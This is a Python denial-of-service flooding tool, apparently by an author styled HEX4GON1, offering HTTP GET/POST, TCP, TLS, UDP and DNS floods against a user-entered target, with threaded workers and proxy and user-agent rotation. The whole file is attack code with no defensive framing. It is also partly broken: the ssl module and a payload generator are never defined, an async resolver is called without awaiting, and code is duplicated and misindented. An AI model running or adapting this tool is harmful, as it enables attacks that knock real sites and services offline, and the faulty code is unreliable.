import os
import sys
import time
import socket
import threading
import random
import requests
import dns.resolver
from urllib.parse import urlparse
from threading import Thread
import asyncio
from colorama import Fore

# ==========================
# --- Your banner ---
# ==========================
def print_banner():
    banner = """
    _/    _/  _/_/_/_/  _/      _/  _/  _/      _/_/_/    _/_/    _/      _/    _/
   _/    _/  _/          _/  _/    _/  _/    _/        _/    _/  _/_/    _/  _/_/
  _/_/_/_/  _/_/_/        _/      _/_/_/_/  _/  _/_/  _/    _/  _/  _/  _/    _/
 _/    _/  _/          _/  _/        _/    _/    _/  _/    _/  _/    _/_/    _/
_/    _/  _/_/_/_/  _/      _/      _/      _/_/_/    _/_/    _/      _/    _/
    """
    print(Fore.CYAN + banner + Fore.RESET)

# ==========================
# --- Your description ---
# ==========================
def print_description():
    description = """Author: HEX4GON1
    Telegram: https://t.me/hex4gon1

    This tool allows you to launch multiple attack methods simultaneously.
    Please choose the attack methods you want to use from the menu and enter the target information.
    To select multiple options, use commas (e.g., 1,2,4,6).
    The tool will generate unique payloads for each attack method automatically.
    
    For any questions or support, please contact us on Telegram."""
    print_banner()
    print(Fore.GREEN + description + Fore.RESET)

# ==========================
# --- Your menu ---
# ==========================
def print_menu():
    print(Fore.RED + "1. Website Domain\n2. IP Address\n3. URL\n4. TCP\n5. TLS\n6. UDP\n7. ICMP\n8. DNS\n9. HTTP POST\n10. HTTP GET\n11. HTTP HEAD\n12. Exit" + Fore.RESET)

# ==========================
# --- Your attack functions ---
# ==========================

def website_domain_attack(domain):
    ip = resolve_hostname(domain)
    url = f"http://{ip}/"
    headers = {'User-Agent': random.choice(headers_list)}
    for _ in range(100000):
        try:
            requests.get(url, headers=headers)
        except Exception as e:
            print(f"Request failed: {e}")

def ip_address_attack(ip):
    ip_resolved = resolve_hostname(ip)
    url = f"http://{ip_resolved}/"
    headers = {'User-Agent': random.choice(headers_list)}
    for _ in range(100000):
        try:
            requests.get(url, headers=headers)
        except Exception as e:
            print(f"Request failed: {e}")

def url_attack(url):
    headers = {'User-Agent': random.choice(headers_list)}
    for _ in range(100000):
        try:
            requests.get(url, headers=headers)
        except Exception as e:
            print(f"Request failed: {e}")

def tcp_attack(ip, port):
    ip_resolved = resolve_hostname(ip)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((ip_resolved, port))
        for _ in range(100000):
            payload = generate_payload()
            try:
                sock.send(payload.encode())
            except Exception as e:
                print(f"Send failed: {e}")
    except Exception as e:
        print(f"TCP connection failed: {e}")
    finally:
        sock.close()

def tls_attack(domain, port):
    domain_resolved = resolve_hostname(domain)
    context = ssl.create_default_context()
    try:
        conn = context.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM), server_hostname=domain_resolved)
        conn.connect((domain_resolved, port))
        for _ in range(100000):
            payload = generate_payload()
            try:
                conn.send(payload.encode())
            except Exception as e:
                print(f"TLS send failed: {e}")
        conn.close()
    except Exception as e:
        print(f"TLS connection failed: {e}")

def udp_attack(ip, port):
    ip_resolved = resolve_hostname(ip)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for _ in range(100000):
        payload = generate_payload()
        try:
            sock.sendto(payload.encode(), (ip_resolved, port))
        except Exception as e:
            print(f"UDP send failed: {e}")
    sock.close()

def icmp_attack(ip):
    ip_resolved = resolve_hostname(ip)
    print("ICMP attack placeholder. Implement with raw sockets if needed.")

def dns_attack(domain):
    resolver = dns.resolver.Resolver()
    for _ in range(100000):
        try:
            answer = resolver.resolve(domain)
            for data in answer:
                print(f"DNS response for {domain}: {data}")
        except Exception as e:
            print(f"DNS query failed: {e}")

# ==========================
# --- Your `requestPromise` and `makeRequest`, `makeRequestV3` ---
# ==========================

async def requestPromise(options, retries=0):
    try:
        response = requests.request(method=options['method'], url=options['url'], headers=options['headers'], timeout=10)
        global totalSuccess
        totalSuccess += 1
        return response
    except Exception as e:
        global totalFailed
        totalFailed += 1
        if retries < 3:
            await asyncio.sleep(1)
            return await requestPromise(options, retries + 1)

async def makeRequest(url):
    parsed = urlparse(url)
    host = parsed.hostname
    ip = await resolve_hostname(host)
    parsed = parsed._replace(netloc=ip)
    options = {
        'method': 'GET',
        'url': parsed.geturl(),
        'headers': {'User-Agent': random.choice(headers_list)}
    }
    while True:
        await requestPromise(options)
        print(f"Success: {totalSuccess}, Fail: {totalFailed}")
        await asyncio.sleep(random.uniform(0.1, 1))

async def makeRequestV3(url):
    parsed = urlparse(url)
    host = parsed.hostname
    ip = await resolve_hostname(host)
    parsed = parsed._replace(netloc=ip)
    while True:
        await requestPromise({'method': 'GET', 'url': parsed.geturl(), 'headers': {'User-Agent': random.choice(headers_list)}})
        print(f"Success: {totalSuccess}, Fail: {totalFailed}")
        await asyncio.sleep(random.uniform(0.1, 1))

# ==========================
# --- Your hostname resolver ---
# ==========================
async def resolve_hostname(target):
    try:
        return socket.gethostbyname(target)
    except:
        return target

# ==========================
# --- Your main menu and attack logic ---
# ==========================

if __name__ == '__main__':
    if len(sys.argv) > 1:
        # Worker runs attack
        url_arg = sys.argv[1]
        method_type = sys.argv[2] if len(sys.argv) > 2 else 'V3'
        if method_type == 'V3':
            asyncio.run(makeRequestV3(url_arg))
        else:
            asyncio.run(makeRequest(url_arg))
        sys.exit()

    # --- Main menu ---
    print(Fore.CYAN + "=== Welcome to the Attack Script with Banner ===" + Fore.RESET)
    def print_banner():
        banner = """
   _/    _/  _/_/_/_/  _/      _/  _/  _/      _/_/_/    _/_/    _/      _/    _/
  _/    _/  _/          _/  _/    _/  _/    _/        _/    _/  _/_/    _/  _/_/
 _/_/_/_/  _/_/_/        _/      _/_/_/_/  _/  _/_/  _/    _/  _/  _/  _/    _/
_/    _/  _/          _/  _/        _/    _/    _/  _/    _/  _/    _/_/    _/
_/    _/  _/_/_/_/  _/      _/      _/      _/_/_/    _/_/    _/      _/    _/
        """
        print(Fore.CYAN + banner + Fore.RESET)

    print_banner()
    print(Fore.GREEN + "Author: HEX4GON1\nTelegram: https://t.me/hex4gon1\n" + Fore.RESET)

    # Load your headers list
    
headers_list = [
    'Mozilla/5.0', 'Chrome/70.0', 'Safari/537.36', 'Opera/9.80'
]

    # Load proxies and user agents from files
proxies = []
user_agents = []

def load_proxies(path):
    try:
        with open(path, 'r') as f:
            proxies.extend([line.strip() for line in f if line.strip()])
        print(Fore.GREEN + f"Loaded {len(proxies)} proxies." + Fore.RESET)
    except Exception as e:
        print(Fore.RED + f"Failed to load proxies: {e}" + Fore.RESET)

def load_user_agents(path):
    try:
        with open(path, 'r') as f:
            global user_agents
            user_agents.extend([line.strip() for line in f if line.strip()])
        print(Fore.GREEN + f"Loaded {len(user_agents)} user agents." + Fore.RESET)
    except Exception as e:
        print(Fore.RED + f"Failed to load user agents: {e}" + Fore.RESET)

# User input
target_url = input("Enter target URL: ")
duration_sec = int(input("Enter duration (seconds): "))
thread_count = int(input("Enter number of threads: "))
proxy_file_path = input("Enter proxy file path: ")
user_agent_file_path = input("Enter user agent file path: ")
method_choice = input("Select method (V1, V2, or V3): ")

load_proxies(proxy_file_path)
load_user_agents(user_agent_file_path)

# Spawn worker threads
threads = []

for _ in range(thread_count):
    t = Thread(target=lambda: asyncio.run(
        makeRequest(target_url) if method_choice != 'V3' else makeRequestV3(target_url)
    ))
    t.daemon = True
    t.start()
    threads.append(t)

# Run for the specified duration
try:
    time.sleep(duration_sec)
except KeyboardInterrupt:
    pass

print("Time's up! Exiting.")
sys.exit()
